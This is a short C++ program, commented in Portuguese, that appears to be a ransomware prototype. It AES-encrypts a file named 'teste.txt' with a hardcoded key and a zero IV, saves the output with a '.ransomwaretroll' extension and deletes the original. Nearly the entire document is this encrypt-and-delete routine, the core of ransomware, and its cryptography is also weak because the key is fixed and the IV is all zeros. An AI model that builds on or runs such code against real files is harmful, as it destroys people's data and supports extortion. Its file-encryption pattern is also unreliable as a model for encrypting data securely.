#include <iostream>
#include <fstream>
#include <vector>
#include <filesystem>
#include <cryptopp/modes.h>
#include <cryptopp/aes.h>
#include <cryptopp/filters.h>
#include <cryptopp/secblock.h>

namespace fs = std::filesystem;

void encryptFile(const std::string& inputFile, const std::string& encryptedFile, const std::string& keyString) {
    // Abrir o arquivo para leitura
    std::ifstream file(inputFile, std::ios::binary);
    if (!file) {
        std::cerr << "Erro ao abrir o arquivo: " << inputFile << std::endl;
        return;
    }

    std::vector<CryptoPP::byte> fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    // Preparar chave de criptografia
    CryptoPP::SecByteBlock key(reinterpret_cast<const CryptoPP::byte*>(keyString.data()), CryptoPP::AES::DEFAULT_KEYLENGTH);
    CryptoPP::byte iv[CryptoPP::AES::BLOCKSIZE] = {0};  // IV inicializado com zeros

    // Configurar o modo CTR
    CryptoPP::CTR_Mode<CryptoPP::AES>::Encryption encryption;
    encryption.SetKeyWithIV(key, key.size(), iv);

    std::vector<CryptoPP::byte> encryptedData(fileData.size());
    CryptoPP::ArraySink sink(encryptedData.data(), encryptedData.size());

    CryptoPP::ArraySource(fileData.data(), fileData.size(), true,
        new CryptoPP::StreamTransformationFilter(encryption, new CryptoPP::Redirector(sink)));

    // Gravar o conteúdo criptografado
    std::ofstream outputFile(encryptedFile, std::ios::binary);
    outputFile.write(reinterpret_cast<char*>(encryptedData.data()), encryptedData.size());
    outputFile.close();

    // Remover o arquivo original
    fs::remove(inputFile);

    std::cout << "Arquivo criptografado com sucesso: " << encryptedFile << std::endl;
}

int main() {
    std::string inputFile = "teste.txt";
    std::string encryptedFile = inputFile + ".ransomwaretroll";
    std::string key = "testeransomwares";

    encryptFile(inputFile, encryptedFile, key);

    return 0;
}

